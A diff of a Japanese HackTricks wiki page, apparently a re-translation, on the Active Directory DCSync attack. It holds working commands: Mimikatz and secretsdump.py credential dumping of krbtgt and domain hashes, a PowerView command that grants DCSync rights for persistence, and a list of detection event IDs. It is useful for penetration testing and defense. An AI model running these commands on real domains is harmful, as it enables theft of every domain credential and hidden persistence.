@@ -1,80 +1,80 @@
 # DCSync
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で**最も高度な**コミュニティツールを駆使した**ワークフローを簡単に構築し、自動化**します。\
-今すぐアクセス：
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も**高度な**コミュニティツールによって**強化**された**ワークフロー**を簡単に構築し、**自動化**します。\
+今すぐアクセスしてください：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>
+<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**</strong>を使用して、ゼロからヒーローまでAWSハッキングを学びましょう！</summary>
 
 HackTricksをサポートする他の方法：
 
-* **HackTricksに広告を掲載したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
-* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、ハッキングのコツを**共有する**。
+* **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手してください
+* 独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションである[**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
+* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。
 
 </details>
 
 ## DCSync
 
-**DCSync**権限には、ドメイン自体に対するこれらの権限が含まれます：**DS-Replication-Get-Changes**、**Replicating Directory Changes All**、**Replicating Directory Changes In Filtered Set**。
+**DCSync**権限は、ドメイン自体に対してこれらの権限を持つことを意味します：**DS-Replication-Get-Changes**、**Replicating Directory Changes All**、および**Replicating Directory Changes In Filtered Set**。
 
-**DCSyncに関する重要な注意点：**
+**DCSyncに関する重要な注意事項:**
 
-* **DCSync攻撃はドメインコントローラの動作をシミュレートし、他のドメインコントローラにディレクトリレプリケーションサービスリモートプロトコル（MS-DRSR）を使用して情報のレプリケーションを依頼します**。MS-DRSRはActive Directoryの有効かつ必要な機能であるため、オフにしたり無効にすることはできません。
-* デフォルトでは、**ドメイン管理者、エンタープライズ管理者、管理者、およびドメインコントローラ**グループのみが必要な権限を持っています。
-* アカウントのパスワードが可逆暗号化で保存されている場合、Mimikatzにはパスワードをクリアテキストで返すオプションがあります。
+* **DCSync攻撃は、ドメインコントローラーの振る舞いをシミュレートし、他のドメインコントローラーに情報を複製するよう要求**します。これはディレクトリレプリケーションサービスリモートプロトコル（MS-DRSR）を使用します。MS-DRSRはActive Directoryの有効で必要な機能であるため、オフにしたり無効にしたりすることはできません。
+* デフォルトでは、**Domain Admins、Enterprise Admins、Administrators、およびDomain Controllers**グループのみが必要な特権を持っています。
+* 逆転可能な暗号化でアカウントのパスワードが保存されている場合、Mimikatzにはパスワードを平文で返すオプションがあります。
 
 ### 列挙
 
-`powerview`を使用して、これらの権限を持っているユーザーを確認します：
+`powerview`を使用してこれらの権限を持っているユーザーを確認します：
 ```powershell
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
 ```
-### ローカルでのエクスプロイト
+### ローカルでの悪用
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
-### リモートでのエクスプロイト
+### リモートでの悪用
 ```powershell
 secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 [-just-dc-user <USERNAME>] #To get only of that user
 [-pwd-last-set] #To see when each account's password was last changed
 [-history] #To dump password history, may be helpful for offline password cracking
 ```
-`-just-dc`は3つのファイルを生成します：
+`-just-dc`は3つのファイルを生成します:
 
 * **NTLMハッシュ**を含むファイル
 * **Kerberosキー**を含むファイル
-* [**可逆暗号化**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)が有効に設定されたアカウントのNTDSからの平文パスワードを含むファイル。可逆暗号化を使用しているユーザーは以下のコマンドで取得できます。
+* [**逆転置暗号化**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)が有効に設定されたアカウントのNTDSから平文パスワードを含むファイル。逆転置暗号化が有効なユーザーは以下のコマンドで取得できます:
 
 ```powershell
 Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
 ```
 
-### 永続性
+### 持続性
 
-ドメイン管理者であれば、`powerview`を使って任意のユーザーにこの権限を付与することができます：
+ドメイン管理者であれば、`powerview`のヘルプを使用して、任意のユーザーにこの権限を付与できます:
 ```powershell
 Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
 ```
-その後、以下の出力内の"ObjectType"フィールド内に特権の名前が表示されていることを確認することで、**ユーザーに3つの特権が正しく割り当てられたかどうかをチェック**できます。
+その後、**ユーザーが正しく割り当てられているかどうかを確認**することができます。これらの特権を探すために、出力の中でそれらの特権の名前を見つけることができます（特権の名前は「ObjectType」フィールド内に表示されます）：
 ```powershell
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
 ```
-### 軽減策
+### 緩和策
 
-* セキュリティイベントID 4662（オブジェクトの監査ポリシーが有効になっている必要があります） - オブジェクトに対して操作が実行されました
-* セキュリティイベントID 5136（オブジェクトの監査ポリシーが有効になっている必要があります） - ディレクトリサービスオブジェクトが変更されました
-* セキュリティイベントID 4670（オブジェクトの監査ポリシーが有効になっている必要があります） - オブジェクトの権限が変更されました
-* AD ACL Scanner - ACLのレポートを作成し、比較します。 [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)
+* セキュリティイベントID 4662（オブジェクトの監査ポリシーが有効である必要があります）– オブジェクトに操作が実行されました
+* セキュリティイベントID 5136（オブジェクトの監査ポリシーが有効である必要があります）– ディレクトリサービスオブジェクトが変更されました
+* セキュリティイベントID 4670（オブジェクトの監査ポリシーが有効である必要があります）– オブジェクトのアクセス許可が変更されました
+* AD ACLスキャナー - ACLの作成と比較レポートを作成します。[https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)
 
 ## 参考文献
 
@@ -83,22 +83,22 @@ Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveG
 
 <details>
 
-<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>
+<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>!</strong></summary>
 
-HackTricksをサポートする他の方法:
+HackTricksをサポートする他の方法：
 
-* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTコレクション**](https://opensea.io/collection/the-peass-family)です。
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加するか**、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローしてください。**
-* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。
+* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションを見つける
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)をフォローする。
+* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-世界で最も進んだコミュニティツールを駆使して、簡単に**ワークフローを構築し自動化**するために[**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks)を使用してください。\
-今すぐアクセス：
+[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
+今すぐアクセスしてください：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
